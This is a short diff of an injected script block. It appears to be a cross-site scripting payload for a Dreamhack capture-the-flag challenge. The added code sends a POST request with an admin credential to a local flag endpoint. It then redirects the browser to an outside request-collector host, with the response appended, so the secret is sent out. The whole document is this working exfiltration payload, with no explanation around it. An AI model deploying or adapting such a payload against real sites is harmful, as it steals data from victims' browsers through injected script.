@@ -1,13 +1,17 @@
 <script>
-const postData = {
-  'admin': 'zzlol'
+const formData = new FormData();
+formData.append('admin', 'zzlol');
+
+const xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://localhost:8000/flag', true);
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    const response = xhr.responseText;
+    location = 'https://gpeoqxy.request.dreamhack.games/' + response;
+  }
 };
 
-const options = {
-  method: 'POST',
-  body: postData
-};
-
-fetch('http://localhost:8000/flag', options)
-  .then(response => location='https://jqbrrpr.request.dreamhack.games/'+response)
+xhr.send(formData);
 </script>
+
